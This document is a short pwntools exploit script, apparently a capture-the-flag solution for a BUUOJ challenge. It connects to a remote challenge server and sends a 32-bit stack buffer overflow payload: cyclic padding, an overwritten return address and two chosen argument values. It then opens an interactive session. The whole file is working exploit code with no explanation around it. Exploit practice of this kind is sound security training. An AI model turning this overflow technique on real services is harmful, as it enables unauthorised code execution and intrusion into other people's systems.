from pwn import *
context.log_level='debug'
# io = process('pwn')
io = remote('node4.buuoj.cn', 27446)
io.sendline(cyclic(0x6C+4) + p32(0x80485CB) + p32(0) + p32(0xdeadbeef) + p32(0xdeadc0de))
io.interactive()
